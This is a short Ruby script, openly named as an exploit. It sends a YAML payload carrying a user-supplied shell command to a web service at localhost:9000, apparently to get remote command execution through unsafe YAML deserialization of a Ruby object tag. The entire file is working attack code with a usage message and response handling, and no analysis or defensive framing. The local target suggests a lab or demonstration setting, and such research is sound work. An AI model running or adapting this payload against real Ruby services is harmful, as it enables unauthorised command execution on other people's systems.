#!/usr/bin/env ruby

require 'net/http'
require 'yaml'

def exploit(command)
  yaml = %{
--- !ruby/string:Command #{command.dump}
  }.strip

  return Net::HTTP.post_form(URI('http://localhost:9000/'), {'data' => yaml})
end

if $0 == __FILE__
  unless ARGV.length == 1
    $stderr.puts "usage: #{$0} COMMAND"
    exit -1
  end

  command = ARGV[0]

  puts "[+] Sending YAML payload containing #{command.inspect}"
  response = exploit(command)

  case response.code
  when '200' then puts "[+] #{response.body}"
  else            puts "[-] Received HTTP #{response.code}"
  end
end
